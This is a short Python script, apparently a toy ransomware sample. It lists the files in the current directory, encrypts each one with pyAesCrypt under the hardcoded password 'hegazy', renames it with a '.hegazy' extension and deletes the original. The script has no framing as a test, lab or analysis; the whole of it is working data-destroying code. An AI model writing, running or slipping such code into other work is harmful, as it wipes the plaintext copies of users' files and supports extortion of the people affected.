import pyAesCrypt
import os
import re

# encryption/decryption buffer size - 64K
def encrypt_and_delete(filem):
	bufferSize = 64 * 1024
	password = "hegazy"
	# encrypt
	pyAesCrypt.encryptFile(filem, filem + ".hegazy" , password, bufferSize)
	#pyAesCrypt.encryptFile(file to encrypt, name of file after encryption , password, bufferSize)
	os.remove(filem)

files = os.listdir()

for file in files:
	x = re.match('\w+\.\w+',file)
	if x:
		encrypt_and_delete(file)




